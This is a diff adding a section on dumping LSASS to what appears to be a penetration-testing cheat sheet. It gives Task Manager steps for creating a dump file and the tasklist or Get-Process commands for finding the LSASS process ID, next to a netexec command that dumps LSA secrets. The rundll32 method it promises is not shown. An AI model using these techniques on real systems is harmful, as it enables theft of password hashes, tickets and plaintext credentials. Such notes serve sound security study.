@@ -45,3 +45,24 @@ netexec smb <ip> --local-auth -u <username> -p <password> --lsa
 ```
 
 LSASS Dump:
+
+By dumping LSASS, we can obtain ntlm hashes, kerberos tickets and plaintext passwords(if wdigest is actually enabled).
+
+-Dumping LSASS
+
+We can dump LSASS is 2 different ways depending on what kind of access we have
+
+If we have GUI Access / RDP, then we can dump LSASS via Taskmgr:
+```
+1.Open Taskmgr
+2.Look for "Local Security Authority Process" in Processes Tab
+3.Right Click, select "Create dump file"
+```
+
+If only command line access is available, we can then dump with the help of rundll32
+```
+(CMD>tasklist /svc #Locate lsass.exe and note its PID
+#or
+(PS)Get-Process lsass # Note its Id
+
+```
